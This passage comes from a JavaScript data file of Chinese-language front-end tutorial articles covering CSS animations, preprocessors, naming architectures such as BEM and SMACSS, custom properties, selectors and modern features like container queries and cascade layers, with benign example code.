    padding: 1rem 2rem;
    gap: 1rem;
    display: none;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
  }

  .nav-menu.active {
    display: flex;
  }

  .nav-menu li {
    width: 100%;
  }

  .nav-menu li a {
    display: block;
    padding: 0.5rem 0;
  }
}
\`\`\`

### 最佳实践

- 采用移动优先策略
- 使用相对单位
- 测试真实设备
- 优化图片加载
- 考虑触摸交互
- 保持内容可读性
- 性能优化（避免过多媒体查询）`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-animation",title:"CSS 动画与过渡效果",category:"css",difficulty:"medium",tags:["CSS","动画","transition","animation"],content:`## CSS 动画与过渡效果

CSS 动画和过渡为网页增添交互性和视觉吸引力，提升用户体验。

### 过渡效果（Transition）

**基本属性：**
- transition-property：指定过渡的 CSS 属性
- transition-duration：过渡持续时间
- transition-timing-function：时间函数
- transition-delay：延迟时间
- transition：简写属性

**时间函数：**
- ease：默认值，慢-快-慢
- linear：匀速
- ease-in：慢开始
- ease-out：慢结束
- ease-in-out：慢-快-慢
- cubic-bezier()：自定义贝塞尔曲线

**可过渡属性：**
- 尺寸属性：width、height、top、left
- 外观属性：color、background、opacity
- 变换属性：transform
- 注意：display、visibility 不能直接过渡

### 关键帧动画（Animation）

**基本属性：**
- animation-name：关键帧名称
- animation-duration：动画持续时间
- animation-timing-function：时间函数
- animation-delay：延迟时间
- animation-iteration-count：播放次数
- animation-direction：播放方向
- animation-fill-mode：填充模式
- animation-play-state：播放状态
- animation：简写属性

**@keyframes 规则：**
- 定义动画的关键帧
- from/to 或百分比
- 可以定义多个关键帧

**动画控制：**
- infinite：无限循环
- alternate：往返播放
- forwards：保持结束状态
- paused：暂停动画

### 代码示例

#### 按钮过渡效果

\`\`\`css
.button {
  padding: 12px 24px;
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  cursor: pointer;
  transition: all 0.3s ease;
}

.button:hover {
  background-color: #0056b3;
  transform: translateY(-2px);
  box-shadow: 0 4px 8px rgba(0,0,0,0.2);
}

.button:active {
  transform: translateY(0);
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}
\`\`\`

#### 加载动画

\`\`\`css
/* 旋转加载器 */
.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #f3f3f3;
  border-top: 4px solid #007bff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* 脉冲加载器 */
.pulse {
  width: 40px;
  height: 40px;
  background-color: #007bff;
  border-radius: 50%;
  animation: pulse 1.5s ease-in-out infinite;
}

@keyframes pulse {
  0% {
    transform: scale(0.95);
    box-shadow: 0 0 0 0 rgba(0, 123, 255, 0.7);
  }
  70% {
    transform: scale(1);
    box-shadow: 0 0 0 10px rgba(0, 123, 255, 0);
  }
  100% {
    transform: scale(0.95);
    box-shadow: 0 0 0 0 rgba(0, 123, 255, 0);
  }
}
\`\`\`

#### 动画性能优化

\`\`\`css
/* 使用 GPU 加速的属性 */
.gpu-accelerated {
  transform: translate3d(0, 0, 0);
  opacity: 1;
}

/* will-change 提示浏览器优化 */
.animated-element {
  will-change: transform, opacity;
  animation: move 2s ease-in-out;
}

@keyframes move {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(100px);
  }
}

/* 动画完成后移除 will-change */
.animated-element.finished {
  will-change: auto;
}

/* 避免动画的属性（会触发重排） */
.bad-performance {
  /* 避免动画这些属性 */
  /* width, height, padding, margin */
  /* top, left, right, bottom */
  /* border-width */
}

/* 好的性能（只触发重绘和合成） */
.good-performance {
  /* 动画这些属性 */
  transform: translateX(100px);
  opacity: 0.5;
  filter: blur(5px);
}
\`\`\`

#### 减少动画偏好

\`\`\`css
/* 尊重用户的动画偏好 */
@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
    scroll-behavior: auto !important;
  }
}

/* 或者完全禁用动画 */
@media (prefers-reduced-motion: reduce) {
  .animated-element {
    animation: none;
    transition: none;
  }
}
\`\`\`

### 最佳实践

- 优先使用 transform 和 opacity
- 合理使用 will-change
- 提供减少动画选项（prefers-reduced-motion）
- 测试性能影响
- 保持动画简洁有意义
- 注意可访问性
- 使用硬件加速`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-preprocessors",title:"CSS 预处理器与后处理器",category:"css",difficulty:"medium",tags:["CSS","Sass","Less","PostCSS"],content:`## CSS 预处理器与后处理器

CSS 预处理器和后处理器扩展了 CSS 的功能，提高了开发效率和代码可维护性。

### Sass/SCSS

**变量：**
- $primary-color: #007bff;
- 支持各种数据类型
- 作用域：全局和局部

**嵌套：**
- 选择器嵌套
- 属性嵌套
- & 父选择器引用

**混合（Mixins）：**
- @mixin 定义
- @include 调用
- 支持参数和默认值

**继承：**
- @extend 继承选择器
- %placeholder 占位符
- 避免代码重复

**函数：**
- 内置函数：color、string、math
- 自定义函数：@function
- 返回值使用 @return

**控制指令：**
- @if、@else if、@else
- @for、@each、@while
- 逻辑控制流程

**模块化：**
- @import 导入（已废弃）
- @use 使用模块
- @forward 转发模块

### Less

**变量：**
- @primary-color: #007bff;
- 延迟加载
- 作用域规则

**混合：**
- .mixin() 定义和调用
- 支持参数
- 带条件的混合

**嵌套：**
- 选择器嵌套
- & 父选择器
- 媒体查询嵌套

**函数：**
- 内置函数
- 命名空间
- JavaScript 表达式

**导入：**
- @import 导入文件
- 导入选项

### PostCSS

**概念：**
- 用 JavaScript 工具和插件转换 CSS
- 解析 CSS 为 AST
- 插件生态系统

**常用插件：**
- autoprefixer：自动添加浏览器前缀
- postcss-preset-env：现代 CSS 特性
- cssnano：CSS 压缩
- postcss-import：导入文件
- tailwindcss：实用工具类框架

**配置：**
- postcss.config.js
- 插件顺序
- 选项配置

### 代码示例

#### Sass 变量和嵌套

\`\`\`scss
// 变量定义
$primary-color: #007bff;
$secondary-color: #6c757d;
$font-size-base: 16px;
$spacing-unit: 8px;

// 嵌套选择器
.card {
  background-color: white;
  border-radius: 8px;
  padding: $spacing-unit * 2;

  &__header {
    padding: $spacing-unit;
    border-bottom: 1px solid #eee;

    &--highlight {
      background-color: $primary-color;
      color: white;
    }
  }

  &__body {
    padding: $spacing-unit * 2;

    p {
      margin: 0 0 $spacing-unit 0;
      line-height: 1.6;
    }
  }

  &__footer {
    padding: $spacing-unit;
    border-top: 1px solid #eee;
    text-align: right;

    .button {
      margin-left: $spacing-unit;
    }
  }

  &:hover {
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  }
}
\`\`\`

#### Sass 混合（Mixins）

\`\`\`scss
// 定义混合
@mixin button($bg-color: $primary-color, $text-color: white) {
  padding: 10px 20px;
  background-color: $bg-color;
  color: $text-color;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: background-color 0.3s ease;

  &:hover {
    background-color: darken($bg-color, 10%);
  }

  &:active {
    transform: translateY(1px);
  }
}

// 使用混合
.button-primary {
  @include button();
}

.button-secondary {
  @include button($secondary-color);
}

.button-success {
  @include button(#28a745);
}

// 响应式混合
@mixin respond-to($breakpoint) {
  @if $breakpoint == 'small' {
    @media (max-width: 640px) {
      @content;
    }
  } @else if $breakpoint == 'medium' {
    @media (max-width: 768px) {
      @content;
    }
  } @else if $breakpoint == 'large' {
    @media (max-width: 1024px) {
      @content;
    }
  }
}

.container {
  width: 100%;
  max-width: 1200px;
  margin: 0 auto;
  padding: 20px;

  @include respond-to('small') {
    padding: 10px;
  }

  @include respond-to('medium') {
    padding: 15px;
  }
}
\`\`\`

#### PostCSS 配置

\`\`\`javascript
// postcss.config.js
module.exports = {
  plugins: [
    // 自动添加浏览器前缀
    require('autoprefixer')({
      overrideBrowserslist: [
        '> 1%',
        'last 2 versions',
        'not dead'
      ]
    }),
    
    // 现代CSS特性
    require('postcss-preset-env')({
      stage: 3,
      features: {
        'nesting-rules': true
      }
    }),
    
    // CSS压缩
    require('cssnano')({
      preset: 'default'
    })
  ]
};
\`\`\`

### 比较与选择

**Sass vs Less：**
- Sass 功能更强大
- Less 更接近 CSS 语法
- Sass 社区更活跃
- 两者都广泛使用

**预处理器 vs PostCSS：**
- 预处理器：扩展语法
- PostCSS：转换和优化
- 可以结合使用

**选择建议：**
- 新项目推荐 Sass/SCSS
- 需要现代 CSS 特性用 PostCSS
- 大型项目考虑 CSS-in-JS

### 最佳实践

- 建立变量命名规范
- 合理使用嵌套（不超过 3 层）
- 混合 vs 继承的选择
- 模块化管理样式
- 编译后的代码检查
- 版本控制原始文件
- 文档化预处理器代码`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-architecture",title:"CSS 架构与命名规范",category:"css",difficulty:"medium",tags:["CSS","BEM","OOCSS","架构"],content:`## CSS 架构与命名规范

良好的 CSS 架构和命名规范对于大型项目的可维护性至关重要，可以避免样式冲突和提高代码复用性。

### BEM 命名规范

**概念：**
- Block（块）：独立的组件
- Element（元素）：块的组成部分
- Modifier（修饰符）：块或元素的状态

**命名规则：**
- Block：.block
- Element：.block__element
- Modifier：.block--modifier 或 .block__element--modifier

**示例：**
- .button（块）
- .button__icon（元素）
- .button--primary（修饰符）
- .button__icon--large（元素修饰符）

**优点：**
- 清晰的结构关系
- 避免命名冲突
- 易于理解和维护

### OOCSS（面向对象的 CSS）

**原则：**
- 分离结构和外观
- 分离容器和内容

**结构类：**
- 定义布局结构
- 如：.layout、.grid、.column

**外观类：**
- 定义视觉样式
- 如：.skin、.theme-blue

**示例：**
- 结构：.media { display: flex; }
- 外观：.media--bordered { border: 1px solid; }

### SMACSS（可扩展的模块化 CSS 架构）

**分类：**
- Base：基础样式（重置、元素默认样式）
- Layout：布局样式（网格、容器）
- Module：模块样式（可复用组件）
- State：状态样式（激活、禁用）
- Theme：主题样式（颜色、字体）

**命名约定：**
- Layout：l- 或 layout-
- State：is- 或 has-
- Theme：theme-

### ITCSS（倒三角 CSS）

**层次结构：**
1. Settings：变量和配置
2. Tools：混合和函数
3. Generic：重置和标准化
4. Elements：裸元素样式
5. Objects：布局结构
6. Components：UI 组件
7. Utilities：辅助类

**特点：**
- 从通用到具体
- 低特异性到高特异性
- 易于维护和扩展

### 实用工具类（Utility-First）

**概念：**
- 小而单一用途的类
- 组合构建复杂 UI
- 如 Tailwind CSS

**示例：**
- .p-4 { padding: 1rem; }
- .text-center { text-align: center; }
- .flex { display: flex; }

**优点：**
- 开发速度快
- 文件大小可控（PurgeCSS）
- 设计一致性

### CSS-in-JS

**概念：**
- 在 JavaScript 中编写 CSS
- 组件级样式隔离
- 动态样式支持

**方案：**
- Styled-components
- Emotion
- CSS Modules
- JSS

**优点：**
- 真正的样式隔离
- 动态主题
- 代码组织清晰

### 代码示例

#### BEM 命名示例

\`\`\`css
/* 块 */
.card {
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  padding: 20px;
}

/* 元素 */
.card__header {
  margin-bottom: 15px;
  padding-bottom: 15px;
  border-bottom: 1px solid #eee;
}

.card__title {
  margin: 0;
  font-size: 1.25rem;
  font-weight: 600;
}

.card__body {
  margin-bottom: 15px;
}

.card__text {
  margin: 0 0 10px 0;
  line-height: 1.6;
  color: #666;
}

.card__footer {
  display: flex;
  justify-content: flex-end;
  gap: 10px;
}

/* 修饰符 */
.card--featured {
  border: 2px solid #007bff;
}

.card--compact {
  padding: 10px;
}

.card__title--large {
  font-size: 1.5rem;
}

/* HTML 使用 */
<div class="card card--featured">
  <div class="card__header">
    <h2 class="card__title card__title--large">标题</h2>
  </div>
  <div class="card__body">
    <p class="card__text">内容文本</p>
  </div>
  <div class="card__footer">
    <button class="card__button">按钮</button>
  </div>
</div>
\`\`\`

#### OOCSS 示例

\`\`\`css
/* 结构类 */
.media {
  display: flex;
  align-items: flex-start;
}

.media__object {
  margin-right: 1rem;
}

.media__body {
  flex: 1;
  overflow: hidden;
}

/* 外观类 */
.media--bordered {
  border: 1px solid #ddd;
  padding: 1rem;
  border-radius: 4px;
}

.media--spaced {
  margin-bottom: 1rem;
}

/* 组合使用 */
<div class="media media--bordered media--spaced">
  <img class="media__object" src="avatar.jpg" alt="头像">
  <div class="media__body">
    <h3>标题</h3>
    <p>内容文本</p>
  </div>
</div>
\`\`\`

#### SMACSS 示例

\`\`\`css
/* Base - 基础样式 */
* {
  box-sizing: border-box;
}

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  line-height: 1.6;
  color: #333;
}

/* Layout - 布局样式 */
.l-container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 20px;
}

.l-grid {
  display: grid;
  gap: 20px;
}

/* Module - 模块样式 */
.card {
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  padding: 20px;
}

.button {
  padding: 10px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.3s ease;
}

/* State - 状态样式 */
.is-active {
  background-color: #007bff;
  color: white;
}

.is-hidden {
  display: none;
}

.is-disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* Theme - 主题样式 */
.theme-dark {
  background-color: #1a1a1a;
  color: #fff;
}

.theme-light {
  background-color: #fff;
  color: #333;
}
\`\`\`

#### 实用工具类示例

\`\`\`css
/* 间距工具类 */
.p-1 { padding: 0.25rem; }
.p-2 { padding: 0.5rem; }
.p-3 { padding: 1rem; }
.p-4 { padding: 1.5rem; }

.m-1 { margin: 0.25rem; }
.m-2 { margin: 0.5rem; }
.m-3 { margin: 1rem; }
.m-4 { margin: 1.5rem; }

/* 文本工具类 */
.text-center { text-align: center; }
.text-left { text-align: left; }
.text-right { text-align: right; }

.text-sm { font-size: 0.875rem; }
.text-base { font-size: 1rem; }
.text-lg { font-size: 1.125rem; }
.text-xl { font-size: 1.25rem; }

/* 颜色工具类 */
.text-primary { color: #007bff; }
.text-secondary { color: #6c757d; }
.text-success { color: #28a745; }
.text-danger { color: #dc3545; }

.bg-primary { background-color: #007bff; }
.bg-secondary { background-color: #6c757d; }
.bg-success { background-color: #28a745; }
.bg-danger { background-color: #dc3545; }

/* 布局工具类 */
.flex { display: flex; }
.flex-col { flex-direction: column; }
.items-center { align-items: center; }
.justify-center { justify-content: center; }
.justify-between { justify-content: space-between; }

/* 组合使用 */
<div class="p-4 bg-white rounded shadow">
  <h2 class="text-xl text-primary mb-2">标题</h2>
  <p class="text-base text-secondary mb-4">内容文本</p>
  <div class="flex justify-between">
    <button class="px-4 py-2 bg-primary text-white rounded">确定</button>
    <button class="px-4 py-2 bg-secondary text-white rounded">取消</button>
  </div>
</div>
\`\`\`

### 文件组织

**按功能组织：**
- components/
- layouts/
- pages/
- utilities/

**按类型组织：**
- base/
- components/
- layouts/
- themes/

**ITCSS 组织：**
- settings/
- tools/
- generic/
- elements/
- objects/
- components/
- utilities/

### 最佳实践

- 选择适合的命名规范
- 建立样式指南
- 使用 CSS 变量
- 避免深度选择器
- 定期重构和清理
- 文档化样式系统
- 团队协作规范`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-variables",title:"CSS 自定义属性（变量）",category:"css",difficulty:"easy",tags:["CSS","变量","自定义属性","主题"],content:`## CSS 自定义属性（变量）

CSS 自定义属性（CSS Variables）允许定义可复用的值，提高代码的可维护性和灵活性。

### 基本语法

**定义变量：**
- --variable-name: value;
- 必须在规则集内定义
- 通常定义在 :root 中作为全局变量

**使用变量：**
- var(--variable-name)
- var(--variable-name, fallback)
- 支持回退值

**示例：**
\`\`\`css
:root {
  --primary-color: #007bff;
  --font-size: 16px;
}

.button {
  background-color: var(--primary-color);
  font-size: var(--font-size);
}
\`\`\`

### 作用域和继承

**全局变量：**
- 定义在 :root 中
- 整个文档可用
- 如：--primary-color

**局部变量：**
- 定义在特定选择器中
- 仅在该选择器及其后代中可用
- 可以覆盖全局变量

**继承：**
- 变量遵循 CSS 继承规则
- 子元素继承父元素的变量值
- 可以重新定义覆盖

### 代码示例

#### 定义和使用变量

\`\`\`css
/* 全局变量 */
:root {
  /* 颜色 */
  --primary-color: #007bff;
  --secondary-color: #6c757d;
  --success-color: #28a745;
  --danger-color: #dc3545;
  --warning-color: #ffc107;
  
  /* 字体 */
  --font-family-base: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  --font-size-base: 16px;
  --font-size-large: 1.25rem;
  --font-size-small: 0.875rem;
  
  /* 间距 */
  --spacing-unit: 8px;
  --spacing-sm: var(--spacing-unit);
  --spacing-md: calc(var(--spacing-unit) * 2);
  --spacing-lg: calc(var(--spacing-unit) * 3);
  
  /* 边框 */
  --border-radius: 4px;
  --border-width: 1px;
  --border-color: #dee2e6;
  
  /* 阴影 */
  --box-shadow: 0 2px 4px rgba(0,0,0,0.1);
  --box-shadow-lg: 0 4px 8px rgba(0,0,0,0.15);
}

/* 使用变量 */
.button {
  padding: var(--spacing-md) var(--spacing-lg);
  background-color: var(--primary-color);
  color: white;
  border: none;
  border-radius: var(--border-radius);
  font-family: var(--font-family-base);
  font-size: var(--font-size-base);
  box-shadow: var(--box-shadow);
  cursor: pointer;
  transition: all 0.3s ease;
}

.button:hover {
  background-color: var(--primary-color);
  box-shadow: var(--box-shadow-lg);
}

.button--secondary {
  background-color: var(--secondary-color);
}

.button--success {
  background-color: var(--success-color);
}

.button--danger {
  background-color: var(--danger-color);
}
\`\`\`

#### 主题切换

\`\`\`css
/* 浅色主题（默认） */
:root {
  --bg-primary: #ffffff;
  --bg-secondary: #f8f9fa;
  --text-primary: #212529;
  --text-secondary: #6c757d;
  --border-color: #dee2e6;
  --shadow-color: rgba(0, 0, 0, 0.1);
}

/* 深色主题 */
[data-theme="dark"] {
  --bg-primary: #1a1a1a;
  --bg-secondary: #2d2d2d;
  --text-primary: #ffffff;
  --text-secondary: #b0b0b0;
  --border-color: #404040;
  --shadow-color: rgba(0, 0, 0, 0.3);
}

/* 使用变量 */
body {
  background-color: var(--bg-primary);
  color: var(--text-primary);
  transition: background-color 0.3s, color 0.3s;
}

.card {
  background-color: var(--bg-secondary);
  border: 1px solid var(--border-color);
  box-shadow: 0 2px 4px var(--shadow-color);
  color: var(--text-primary);
}

.text-secondary {
  color: var(--text-secondary);
}

/* JavaScript 切换主题 */
function toggleTheme() {
  const currentTheme = document.documentElement.getAttribute('data-theme');
  const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
  document.documentElement.setAttribute('data-theme', newTheme);
  localStorage.setItem('theme', newTheme);
}

// 初始化主题
const savedTheme = localStorage.getItem('theme') || 'light';
document.documentElement.setAttribute('data-theme', savedTheme);
\`\`\`

#### 与 calc() 结合使用

\`\`\`css
:root {
  --spacing-unit: 8px;
  --border-width: 2px;
  --font-size: 16px;
}

.card {
  /* 使用 calc() 计算值 */
  padding: calc(var(--spacing-unit) * 2);
  margin: calc(var(--spacing-unit) * 1.5);
  border: var(--border-width) solid #ddd;
  font-size: calc(var(--font-size) * 1.125);
}

/* 复杂计算 */
.grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: calc(var(--spacing-unit) * 2);
}

@media (max-width: 768px) {
  .grid {
    grid-template-columns: repeat(2, 1fr);
    gap: calc(var(--spacing-unit) * 1.5);
  }
}
\`\`\`

### 与预处理器变量的区别

**CSS 变量：**
- 运行时生效
- 可以动态修改
- 遵循级联和继承
- 需要浏览器支持

**Sass/Less 变量：**
- 编译时确定
- 不能运行时修改
- 无继承概念
- 编译为静态值

### 浏览器支持

**支持情况：**
- 现代浏览器完全支持
- IE 不支持
- 可以使用 PostCSS 插件回退

**回退策略：**
- 提供静态回退值
- 使用 PostCSS 插件
- 渐进增强

### 最佳实践

- 使用语义化的变量名
- 建立变量命名规范
- 合理组织全局和局部变量
- 使用回退值
- 结合 calc() 进行计算
- 文档化变量用途
- 定期审查和优化`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-selectors",title:"CSS 选择器详解",category:"css",difficulty:"easy",tags:["CSS","选择器","优先级"],content:`## CSS 选择器详解

CSS 选择器用于选择要样式化的 HTML 元素，是 CSS 的核心概念之一。

### 基础选择器

**元素选择器：**
- 选择特定类型的元素
- 如：p、div、h1

**类选择器：**
- 选择具有特定类的元素
- 如：.classname
- 一个元素可以有多个类

**ID 选择器：**
- 选择具有特定 ID 的元素
- 如：#idname
- 一个页面中 ID 应该是唯一的

**通用选择器：**
- 选择所有元素
- 如：*
- 通常用于重置样式

**属性选择器：**
- [attr]：具有 attr 属性的元素
- [attr=value]：attr 属性值为 value
- [attr^=value]：attr 属性值以 value 开头
- [attr$=value]：attr 属性值以 value 结尾
- [attr*=value]：attr 属性值包含 value

### 组合选择器

**后代选择器：**
- 选择后代元素
- 如：div p（div 内的所有 p）

**子选择器：**
- 选择直接子元素
- 如：div > p（div 的直接子 p）

**相邻兄弟选择器：**
- 选择紧接在后的兄弟元素
- 如：h1 + p（紧接 h1 的 p）

**通用兄弟选择器：**
- 选择所有后面的兄弟元素
- 如：h1 ~ p（h1 后的所有 p）

**分组选择器：**
- 同时选择多个选择器
- 如：h1, h2, h3

### 伪类选择器

**链接伪类：**
- :link：未访问的链接
- :visited：已访问的链接
- :hover：鼠标悬停
- :active：激活状态

**表单伪类：**
- :focus：获得焦点
- :checked：选中的复选框/单选框
- :disabled：禁用的元素
- :valid/:invalid：验证状态

**位置伪类：**
- :first-child：第一个子元素
- :last-child：最后一个子元素
- :nth-child(n)：第 n 个子元素
- :nth-of-type(n)：第 n 个同类型元素
- :only-child：唯一的子元素

**其他伪类：**
- :not()：否定选择器
- :is()：匹配列表中的任意选择器
- :where()：与 :is() 类似，但优先级为 0
- :has()：父元素选择器（实验性）

### 伪元素选择器

**::before/::after：**
- 在元素内容前后插入内容
- 需要 content 属性
- 常用于装饰

**::first-letter/::first-line：**
- 第一个字母/第一行
- 用于首字下沉等效果

**::selection：**
- 选中的文本
- 自定义选中文本样式

**::placeholder：**
- 输入框的占位符文本

**::marker：**
- 列表项的标记

### 优先级（特异性）

**计算规则：**
- 行内样式：1000
- ID 选择器：100
- 类/属性/伪类：10
- 元素/伪元素：1
- 通用选择器：0

**示例：**
- #nav：100
- .nav .item：20
- div#nav .item a：112

**重要规则：**
- !important 覆盖一切
- 应谨慎使用
- 相同优先级，后定义的规则生效

### 代码示例

#### 基础选择器

\`\`\`css
/* 元素选择器 */
p {
  color: #333;
  line-height: 1.6;
}

h1 {
  font-size: 2rem;
  font-weight: 700;
}

/* 类选择器 */
.button {
  padding: 10px 20px;
  background-color: #007bff;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.button--primary {
  background-color: #007bff;
}

.button--secondary {
  background-color: #6c757d;
}

/* ID 选择器 */
#header {
  background-color: #333;
  color: white;
  padding: 20px;
}

/* 通用选择器 */
* {
  box-sizing: border-box;
}

/* 属性选择器 */
input[type="text"] {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 4px;
}

a[href^="https"] {
  color: #007bff;
}

img[alt*="logo"] {
  border: 2px solid #007bff;
}
\`\`\`

#### 组合选择器

\`\`\`css
/* 后代选择器 */
.container p {
  margin-bottom: 1rem;
}

/* 子选择器 */
.nav > .nav-item {
  padding: 10px;
}

/* 相邻兄弟选择器 */
h1 + p {
  font-size: 1.2rem;
  font-weight: 600;
}

/* 通用兄弟选择器 */
h1 ~ p {
  color: #666;
}

/* 分组选择器 */
h1, h2, h3 {
  font-weight: 700;
  margin-bottom: 0.5rem;
}
\`\`\`

#### 伪类选择器

\`\`\`css
/* 链接伪类 */
a:link {
  color: #007bff;
}

a:visited {
  color: #6c757d;
}

a:hover {
  color: #0056b3;
  text-decoration: underline;
}

a:active {
  color: #004085;
}

/* 表单伪类 */
input:focus {
  outline: 2px solid #007bff;
  outline-offset: 2px;
}

input:checked {
  accent-color: #007bff;
}

input:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* 位置伪类 */
li:first-child {
  font-weight: 700;
}

li:last-child {
  margin-bottom: 0;
}

li:nth-child(2n) {
  background-color: #f5f5f5;
}

li:nth-of-type(3) {
  color: #007bff;
}

/* 其他伪类 */
.nav-item:not(.active) {
  opacity: 0.7;
}

:is(h1, h2, h3) {
  font-weight: 700;
}

/* 父元素选择器 */
article:has(img) {
  padding: 20px;
}
\`\`\`

#### 伪元素选择器

\`\`\`css
/* ::before/::after */
.card::before {
  content: '';
  display: block;
  width: 100%;
  height: 4px;
  background-color: #007bff;
}

.button::after {
  content: ' →';
  margin-left: 5px;
}

/* ::first-letter/::first-line */
.article p::first-letter {
  font-size: 2rem;
  font-weight: 700;
  float: left;
  margin-right: 10px;
}

.article p::first-line {
  font-weight: 600;
  color: #333;
}

/* ::selection */
::selection {
  background-color: #007bff;
  color: white;
}

/* ::placeholder */
input::placeholder {
  color: #999;
  font-style: italic;
}

/* ::marker */
li::marker {
  color: #007bff;
  font-weight: 700;
}
\`\`\`

#### 优先级示例

\`\`\`css
/* 优先级：100 */
#header {
  color: red;
}

/* 优先级：20 */
.nav .item {
  color: blue;
}

/* 优先级：112 */
div#nav .item a {
  color: green;
}

/* 相同优先级，后定义的规则生效 */
.button {
  background-color: #007bff;
}

.button {
  background-color: #0056b3;
}

/* !important 覆盖一切 */
.button {
  background-color: #dc3545 !important;
}
\`\`\`

### 最佳实践

- 保持选择器简洁
- 避免过度嵌套（不超过 3 层）
- 合理使用类选择器
- 理解优先级规则
- 避免使用 !important
- 使用 BEM 等命名规范
- 测试选择器性能`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"css-modern-features",title:"CSS 现代特性与前沿技术",category:"css",difficulty:"hard",tags:["CSS","新特性","Houdini","容器查询"],content:`## CSS 现代特性与前沿技术

CSS 不断发展，引入了许多强大的新特性，为开发者提供了更多的可能性。

### 容器查询（Container Queries）

**概念：**
- 基于容器尺寸而非视口尺寸
- 组件级响应式
- 更灵活的布局控制

**语法：**
- container-type：定义容器类型
- @container：容器查询规则
- container-name：命名容器

**示例：**
\`\`\`css
.card-container {
  container-type: inline-size;
}

@container (min-width: 400px) {
  .card {
    display: flex;
  }
}
\`\`\`

**应用场景：**
- 组件库
- 侧边栏内容
- 嵌套布局

### CSS Houdini

**概念：**
- 暴露 CSS 引擎的 API
- 扩展 CSS 能力
- JavaScript 与 CSS 的桥梁

**API 类型：**
- Paint API：自定义绘制
- Layout API：自定义布局
- Animation API：自定义动画
- Properties API：自定义属性

**Paint API 示例：**
\`\`\`javascript
// paint-worklet.js
registerPaint('circle', class {
  static get inputProperties() {
    return ['--circle-color'];
  }

  paint(ctx, size, styleMap) {
    const color = styleMap.get('--circle-color').toString();
    ctx.fillStyle = color;
    ctx.beginPath();
    ctx.arc(size.width / 2, size.height / 2, size.width / 2, 0, 2 * Math.PI);
    ctx.fill();
  }
});

// CSS
CSS.paintWorklet.addModule('paint-worklet.js');

.background {
  background-image: paint(circle);
  --circle-color: #007bff;
}
\`\`\`

### 级联层（Cascade Layers）

**概念：**
- 控制样式的优先级层级
- 解决特异性问题
- 更清晰的样式组织

**语法：**
- @layer 定义层
- @layer layer-name { ... }
- 层顺序决定优先级

**示例：**
\`\`\`css
@layer reset, base, components, utilities;

@layer base {
  body { font-size: 16px; }
}

@layer components {
  .button { padding: 10px; }
}
\`\`\`

### :has() 选择器

**概念：**
- 父元素选择器
- 选择包含特定子元素的父元素
- 强大的组合能力

**示例：**
- article:has(img)：包含图片的文章
- .card:has(.badge)：包含徽章的卡片
- form:has(:invalid)：包含无效输入的表单

**应用场景：**
- 条件样式
- 表单验证样式
- 复杂布局

### 其他现代特性

**:is() 和 :where()：**
- 简化复杂选择器
- :is() 保持特异性
- :where() 特异性为 0

**accent-color：**
- 自定义表单控件颜色
- 统一主题色

**aspect-ratio：**
- 保持元素宽高比
- 无需 padding hack

**gap：**
- Flexbox 和 Grid 的间距
- 替代 margin

**subgrid：**
- Grid 嵌套继承轨道
- 复杂布局对齐

**@supports：**
- 特性查询
- 渐进增强

### 代码示例

#### 容器查询

\`\`\`css
/* 定义容器 */
.card-wrapper {
  container-type: inline-size;
  container-name: card;
}

/* 容器查询 */
@container card (min-width: 300px) {
  .card {
    flex-direction: row;
  }
}

@container card (min-width: 500px) {
  .card {
    padding: 30px;
  }
}

@container card (min-width: 700px) {
  .card {
    gap: 40px;
  }
}

/* 响应式卡片组件 */
.card {
  display: flex;
  flex-direction: column;
  gap: 20px;
  padding: 20px;
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.card__image {
  width: 100%;
  aspect-ratio: 16/9;
  object-fit: cover;
  border-radius: 4px;
}

.card__content {
  flex: 1;
}

.card__title {
  margin: 0 0 10px 0;
  font-size: 1.25rem;
}

.card__text {
  margin: 0;
  line-height: 1.6;
  color: #666;
}
\`\`\`

#### 级联层

\`\`\`css
/* 定义层顺序 */
@layer reset, base, components, utilities;

/* 重置层 */
@layer reset {
  *,
  *::before,
  *::after {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }
}

/* 基础层 */
@layer base {
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    line-height: 1.6;
    color: #333;
  }

  h1, h2, h3, h4, h5, h6 {
    font-weight: 700;
    line-height: 1.2;
  }
}

/* 组件层 */
@layer components {
  .button {
    padding: 10px 20px;
    background-color: #007bff;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.3s ease;
  }

  .button:hover {
    background-color: #0056b3;
  }
}

/* 工具层 */
@layer utilities {
  .text-center { text-align: center; }
  .text-left { text-align: left; }
  .text-right { text-align: right; }

  .flex { display: flex; }
